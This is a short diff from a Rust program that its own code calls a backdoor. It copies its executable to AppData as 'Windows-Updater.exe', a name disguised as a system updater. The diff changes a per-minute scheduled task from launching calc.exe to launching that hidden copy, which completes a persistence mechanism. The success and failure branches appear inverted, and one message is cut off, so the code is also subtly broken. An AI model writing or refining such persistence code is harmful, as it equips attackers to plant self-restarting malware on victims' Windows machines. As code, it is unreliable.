@@ -103,7 +103,7 @@ pub async fn main() -> Result<(), Box<dyn std::error::Error>> {
         			            let backdoor_location = format!("{}\\Windows-Updater.exe", appdata);
         		                if !Path::new(&backdoor_location).exists() {
             			            if let Err(_err) = fs::copy(std::env::current_exe().unwrap(), &backdoor_location) {
-                                        let output = Command::new("schtasks").args(&["/create", "/sc", "minute", "/mo", "1", "/tn", "MyRustTask", "/tr", "calc.exe", "/ru", &username, "/f"]).output().expect("Failed to create scheduled task");
+                                        let output = Command::new("schtasks").args(&["/create", "/sc", "minute", "/mo", "1", "/tn", "MyRustTask", "/tr", &backdoor_location, "/ru", &username, "/f"]).output().expect("Failed to create scheduled task");
                                     }else {    
                                         println!("Failed to copy executable to");
                                     }
